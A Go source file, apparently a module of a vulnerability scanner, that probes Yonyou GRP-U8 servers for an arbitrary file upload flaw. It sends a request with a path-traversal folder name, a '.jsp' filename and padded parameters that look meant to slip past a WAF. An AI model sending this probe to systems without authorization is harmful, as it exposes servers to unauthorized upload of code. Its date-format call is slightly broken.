package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func UploadFileDataScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	UploadFileData := "用友 GRP-U8 UploadFileData 任意文件上传漏洞"
	urls := address + "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=date.jsp&filename=1.jpg"
	response, err := client.Get(urls)
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, UploadFileData)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, UploadFileData)
		}
		return
	}
	defer response.Body.Close()

	bdooywaf, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Red+"x"+Reset+"] %s 读取响应失败: %s", currentTime, UploadFileData, err)
		fmt.Println(output)
		return
	}
	if response.StatusCode == http.StatusInternalServerError || response.StatusCode == http.StatusMethodNotAllowed {
		if strings.Contains(string(bdooywaf), "GIF89a") || strings.Contains(string(bdooywaf), "aliyun") || strings.Contains(string(bdooywaf), "waf") {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, UploadFileData, response.StatusCode)
			fmt.Println(output)
		} else {
			result7 := UploadFileData + "：" + urls
			//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
			timestamp := time.Now().Format("20230712")
			filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
			err := Utils.SaveResultToFile(result7, filename) // 保存结果到文本文件
			if err != nil {
				log.Println("保存结果到文件出错:", err)
			} else {

			}
			output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, UploadFileData, urls)
			fmt.Println(output)
		}
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, UploadFileData, response.StatusCode)
		fmt.Println(output)
	}
}
